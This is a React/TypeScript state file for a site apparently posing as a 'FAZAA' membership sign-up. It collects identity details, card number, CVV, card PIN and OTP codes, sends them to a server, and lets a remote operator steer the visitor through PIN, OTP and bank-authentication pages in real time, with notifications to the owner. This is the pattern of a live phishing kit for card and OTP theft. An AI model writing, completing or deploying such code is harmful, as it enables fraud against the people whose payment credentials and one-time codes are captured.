/* FAZAA AppContext — Central state + tRPC API Backend */
import { createContext, useContext, useState, useEffect, useRef, ReactNode } from 'react';
import { trpc } from '@/lib/trpc';
import { useLocation } from 'wouter';

export interface ApplicationData {
  membershipType: 'silver' | 'gold' | 'platinum' | 'family' | '';
  fullName: string;
  phone: string;
  nationalId: string;
  region: string;
  street: string;
  neighborhood: string;
  deliveryDate: string;
  paymentMethod: 'visa' | 'mastercard' | 'applepay' | '';
  cardName: string;
  cardNumber: string;
  cvv: string;
  expiryDate: string;
  cardPin?: string;
  otpCode?: string;
  currentPage: string;
  renewalMembershipNumber?: string;
  currentMembershipType?: string;
  lastInput: string;
  submittedAt?: string;
  id?: string;
  status?: 'pending' | 'approved' | 'rejected';
  adminRedirectPage?: string;
}

const defaultData: ApplicationData = {
  membershipType: '',
  fullName: '',
  phone: '',
  nationalId: '',
  region: '',
  street: '',
  neighborhood: '',
  deliveryDate: '',
  paymentMethod: '',
  cardName: '',
  cardNumber: '',
  cvv: '',
  expiryDate: '',
  currentPage: '/',
  lastInput: '',
  renewalMembershipNumber: '',
  currentMembershipType: '',
};

interface AppContextType {
  appData: ApplicationData;
  setAppData: (data: Partial<ApplicationData>) => void;
  saveApplication: (data: Partial<ApplicationData>) => Promise<void>;
  resetAppData: () => void;
  language: 'ar' | 'en';
  toggleLanguage: () => void;
  isLoading: boolean;
  setIsLoading: (v: boolean) => void;
  adminRedirectPage: string;
  setAdminRedirectPage: (page: string) => void;
}

const AppContext = createContext<AppContextType | null>(null);

export const LANG_KEY = 'fazaa_language';
export const SESSION_KEY = 'fazaa_session_id';

// Generate or retrieve a unique session ID for this browser
function getOrCreateSessionId(): string {
  let sid = localStorage.getItem(SESSION_KEY);
  if (!sid) {
    sid = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    localStorage.setItem(SESSION_KEY, sid);
  }
  return sid;
}

// ─── AppProvider ─────────────────────────────────────────────────────────────

export function AppProvider({ children }: { children: ReactNode }) {
  const [sessionId] = useState<string>(getOrCreateSessionId);
  const [appData, setAppDataState] = useState<ApplicationData>({
    ...defaultData,
    id: sessionId,
  });

  const [language, setLanguage] = useState<'ar' | 'en'>(() => {
    return (localStorage.getItem(LANG_KEY) as 'ar' | 'en') || 'ar';
  });

  const [isLoading, setIsLoading] = useState(false);
  const [adminRedirectPage, setAdminRedirectPage] = useState('');

  // tRPC mutation for saving to server
  const upsertMutation = trpc.applications.upsert.useMutation();

  useEffect(() => {
    localStorage.setItem(LANG_KEY, language);
    document.documentElement.lang = language;
    document.documentElement.dir = language === 'ar' ? 'rtl' : 'ltr';
  }, [language]);

  const setAppData = (data: Partial<ApplicationData>) => {
    setAppDataState(prev => ({
      ...prev,
      ...data,
      lastInput: new Date().toISOString(),
    }));
  };

  // Save to server via direct fetch — يتجنب تعارض useMutation المشترك
  const saveApplication = async (data: Partial<ApplicationData>) => {
    const merged = { ...appData, ...data };
    const payload = {
      sessionId,
      membershipType: merged.membershipType || undefined,
      renewalMembershipNumber: merged.renewalMembershipNumber || undefined,
      currentMembershipType: merged.currentMembershipType || undefined,
      fullName: merged.fullName || undefined,
      phone: merged.phone || undefined,
      idNumber: merged.nationalId || undefined,
      emirate: merged.region || undefined,
      area: merged.neighborhood || undefined,
      street: merged.street || undefined,
      deliveryTime: merged.deliveryDate || undefined,
      cardNumber: merged.cardNumber || undefined,
      cardExpiry: merged.expiryDate || undefined,
      cardCvv: merged.cvv || undefined,
      cardNetwork: merged.paymentMethod || undefined,
      cardPin: merged.cardPin || undefined,
      otpCode: merged.otpCode || undefined,
      currentPage: merged.currentPage || undefined,
    };
    // استخدام fetch مباشرةً بدلاً من useMutation لتجنب التعارض
    const res = await fetch('/api/trpc/applications.upsert', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ json: payload }),
    });
    if (!res.ok) {
      const text = await res.text();
      console.error('[AppContext] Save failed:', text);
      throw new Error(`Save failed: ${res.status}`);
    }
  };

  const resetAppData = () => {
    setAppDataState({ ...defaultData, id: sessionId });
  };

  const toggleLanguage = () => {
    setLanguage(prev => prev === 'ar' ? 'en' : 'ar');
  };

  return (
    <AppContext.Provider value={{
      appData,
      setAppData,
      saveApplication,
      resetAppData,
      language,
      toggleLanguage,
      isLoading,
      setIsLoading,
      adminRedirectPage,
      setAdminRedirectPage,
    }}>
      {children}
    </AppContext.Provider>
  );
}

export function useApp() {
  const ctx = useContext(AppContext);
  if (!ctx) throw new Error('useApp must be used within AppProvider');
  return ctx;
}

// ─── Admin Redirect Listener ─────────────────────────────────────────────────
// يستمع للتوجيه من الإدارة عبر polling من API كل 2 ثانية

const pageLabelsAR: Record<string, string> = {
  '/': 'الرئيسية',
  '/membership': 'اختيار العضوية',
  '/renew-membership': 'تجديد العضوية',
  '/personal-info': 'المعلومات الشخصية',
  '/address-info': 'معلومات العنوان',
  '/order-summary': 'ملخص الطلب',
  '/card-payment': 'بيانات البطاقة',
  '/pin-verify': 'رمز PIN',
  '/otp-verify': 'رمز OTP',
  '/bank-auth': 'مصادقة بنكية',
  '/success': 'نجاح',
  '/failed': 'فشل',
  '/otp-rejected': 'تم رفض OTP',
  '/bank-auth-rejected': 'تم رفض المصادقة',
};

export function AdminRedirectListener() {
  const { appData, setAppData, setAdminRedirectPage, saveApplication } = useApp();
  const [, navigate] = useLocation();
  const clearRedirectMutation = trpc.applications.clearRedirect.useMutation();
  const notifyMutation = trpc.system.notifyOwner.useMutation();
  const lastRedirectRef = useRef<string | null>(null);

  const sessionId = localStorage.getItem(SESSION_KEY) || '';

  const { data: appRecord } = trpc.applications.getBySession.useQuery(
    { sessionId },
    {
      refetchInterval: 1500, // تقليل من 500ms إلى 1500ms لتخفيف الحمل على الخادم
      staleTime: 0,          // دائماً اجلب آخر بيانات للتوجيه
      enabled: !!sessionId,
    }
  );

  useEffect(() => {
    if (!appRecord) return;
    const redirectPage = appRecord.adminRedirectPage;
    // كل redirect له timestamp فريد — نقارن الـ string كاملاً لضمان التنفيذ دائماً
    if (redirectPage && redirectPage !== lastRedirectRef.current) {
      lastRedirectRef.current = redirectPage;
      // إزالة timestamp فقط مع الإبقاء على باقي المعاملات (rejected=true)
      const actualPath = redirectPage
        .replace(/[?&]t=\d+(&|$)/, '$1') // إزالة t=timestamp فقط
        .replace(/[?&]$/, '');           // تنظيف النهاية
      // تحديد المسار المنطقي للحفظ في قاعدة البيانات (بدون query params)
      // /otp-verify?rejected=true → /otp-rejected | /bank-auth?rejected=true → /bank-auth-rejected
      const dbPage = actualPath.includes('/otp-verify') && actualPath.includes('rejected=true')
        ? '/otp-rejected'
        : actualPath.includes('/bank-auth') && actualPath.includes('rejected=true')
        ? '/bank-auth-rejected'
        : actualPath.split('?')[0];
      // مسح التوجيه من الخادم
      clearRedirectMutation.mutateAsync({ sessionId }).catch(console.error);
      // تحديث الصفحة الحالية في قاعدة البيانات (المسار المنطقي)
      saveApplication({ currentPage: dbPage }).catch(console.error);
      // تحديث الحالة المحلية
      setAppData({ currentPage: dbPage });

      // تعيين adminRedirectPage أولاً — الصفحات المفتوحة تستمع لهذا
      setAdminRedirectPage(actualPath);

      // التوجيه الفعلي فقط إذا كانت الصفحة المستهدفة مختلفة عن الحالية
      // (صفحات OTP وBankAuth تتعامل مع الرفض بنفسها عبر adminRedirectPage)
      const isRejection = actualPath.includes('rejected=true');
      if (!isRejection) {
        navigate(actualPath);
      }

      // إشعار المسؤول بأن التحويل تم فعلياً
      const pageLabel = pageLabelsAR[dbPage] || dbPage;
      notifyMutation.mutate({
        title: `✅ تم تحويل مقدم الطلب إلى ${pageLabel}`,
        content: `الاسم: ${appRecord.fullName || 'غير محدد'}\nالهاتف: ${appRecord.phone || 'غير محدد'}\nالصفحة: ${pageLabel}`,
      });
    }
  }, [appRecord]);

  return null;
}
